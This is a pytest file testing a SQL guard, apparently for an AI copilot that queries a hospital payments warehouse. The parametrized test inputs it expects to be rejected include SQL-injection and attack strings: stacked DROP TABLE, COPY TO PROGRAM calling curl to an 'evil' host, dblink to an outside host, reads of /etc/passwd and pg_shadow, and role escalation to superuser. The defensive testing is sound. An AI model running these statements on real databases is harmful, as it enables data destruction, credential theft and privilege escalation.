"""One test (or small group) per guard rule. No database needed."""

import pytest

from warehouse_copilot.sql_guard import GuardError, validate, validate_or_raise

ALLOWED = ("marts.fct_inpatient_drg_payments", "marts.dim_hospitals")


def check(sql: str, **kw):
    return validate(sql, allowed_tables=ALLOWED, max_rows=200, default_schema="marts", **kw)


# Rule 1: parses
def test_rule_parses_rejects_garbage():
    r = check("SELEC hospital FROM WHERE")
    assert not r.ok
    assert any("parse" in v or "SELECT" in v for v in r.violations)


def test_rule_parses_rejects_empty():
    assert not check("   ").ok


# Rule 2: single statement
def test_rule_single_statement_blocks_stacked_queries():
    r = check("SELECT 1; DROP TABLE marts.dim_hospitals")
    assert not r.ok
    assert "exactly one statement" in r.violations[0]


def test_rule_single_statement_allows_trailing_semicolon():
    assert check("SELECT 1;").ok


# Rule 3: SELECT only
def test_rule_select_only_blocks_non_select_root():
    r = check("DELETE FROM marts.dim_hospitals")
    assert not r.ok
    assert any("only SELECT" in v for v in r.violations)


def test_rule_select_only_allows_cte():
    r = check(
        "WITH top AS (SELECT provider_ccn FROM marts.fct_inpatient_drg_payments) "
        "SELECT * FROM top"
    )
    assert r.ok, r.violations


def test_rule_select_only_allows_union():
    r = check("SELECT 1 AS a UNION ALL SELECT 2")
    assert r.ok, r.violations


# Rule 4: no write / DDL anywhere
@pytest.mark.parametrize(
    "sql",
    [
        "WITH gone AS (DELETE FROM marts.dim_hospitals RETURNING *) SELECT * FROM gone",
        "WITH x AS (UPDATE marts.dim_hospitals SET city = 'x' RETURNING *) SELECT * FROM x",
        "WITH x AS (INSERT INTO marts.dim_hospitals VALUES (1) RETURNING *) SELECT * FROM x",
        "SELECT * INTO marts.copy_of_hospitals FROM marts.dim_hospitals",
        "SELECT * FROM marts.dim_hospitals FOR UPDATE",
        "COPY marts.dim_hospitals TO PROGRAM 'curl evil'",
        "GRANT ALL ON marts.dim_hospitals TO public",
        "TRUNCATE marts.dim_hospitals",
        "CREATE TABLE marts.x AS SELECT 1",
        "ALTER ROLE copilot_ro SUPERUSER",
        "SET ROLE postgres",
        "VACUUM",
    ],
)
def test_rule_no_write_or_ddl_anywhere(sql):
    r = check(sql)
    assert not r.ok, sql
    assert r.sql is None


# Rule 5: dangerous functions
@pytest.mark.parametrize(
    "fn_sql",
    [
        "SELECT pg_sleep(60)",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT lo_import('/etc/passwd')",
        "SELECT set_config('statement_timeout', '0', false)",
        "SELECT current_setting('server_version')",
        "SELECT * FROM dblink('host=evil', 'select 1') AS t(a int)",
        "SELECT hospital_name FROM marts.dim_hospitals WHERE pg_sleep(5) IS NULL",
    ],
)
def test_rule_no_dangerous_functions(fn_sql):
    r = check(fn_sql)
    assert not r.ok
    assert any("function" in v for v in r.violations)


def test_rule_dangerous_functions_allows_normal_functions():
    r = check("SELECT ROUND(AVG(avg_medicare_payment), 2) FROM marts.fct_inpatient_drg_payments")
    assert r.ok, r.violations


# Rule 6: allow-listed tables
def test_rule_allowed_tables_blocks_unlisted_table():
    r = check("SELECT * FROM pg_catalog.pg_shadow")
    assert not r.ok
    assert any("allow-list" in v for v in r.violations)


def test_rule_allowed_tables_blocks_unlisted_table_in_subquery():
    r = check(
        "SELECT * FROM marts.dim_hospitals WHERE provider_ccn IN "
        "(SELECT usename FROM pg_user)"
    )
    assert not r.ok


def test_rule_allowed_tables_ignores_cte_names_and_resolves_default_schema():
    r = check(
        "WITH dim_drg AS (SELECT 1 AS x) "
        "SELECT * FROM dim_drg JOIN dim_hospitals ON true"
    )
    assert r.ok, r.violations
    assert r.tables == ["marts.dim_hospitals"]


def test_rule_allowed_tables_blocks_information_schema():
    assert not check("SELECT * FROM information_schema.tables").ok


# Rule 7: row limit
def test_rule_row_limit_added_when_absent():
    r = check("SELECT * FROM marts.dim_hospitals")
    assert r.ok
    assert r.sql.endswith("LIMIT 200")


def test_rule_row_limit_caps_large_limit():
    r = check("SELECT * FROM marts.dim_hospitals LIMIT 100000")
    assert r.ok
    assert "LIMIT 200" in r.sql and "100000" not in r.sql


def test_rule_row_limit_keeps_small_limit():
    r = check("SELECT * FROM marts.dim_hospitals LIMIT 10")
    assert r.sql.endswith("LIMIT 10")


def test_rule_row_limit_replaces_limit_all():
    r = check("SELECT * FROM marts.dim_hospitals LIMIT ALL")
    assert r.ok
    assert r.sql.endswith("LIMIT 200")


def test_rule_row_limit_on_union():
    r = check("SELECT 1 AS a UNION SELECT 2")
    assert r.sql.endswith("LIMIT 200")


# Output hygiene
def test_comments_are_stripped_from_executed_sql():
    r = check("SELECT 1 /* ; DROP TABLE x */")
    assert r.ok
    assert "DROP" not in r.sql


def test_validate_or_raise_raises_with_feedback():
    with pytest.raises(GuardError, match="only SELECT"):
        validate_or_raise("DROP TABLE x", allowed_tables=ALLOWED)
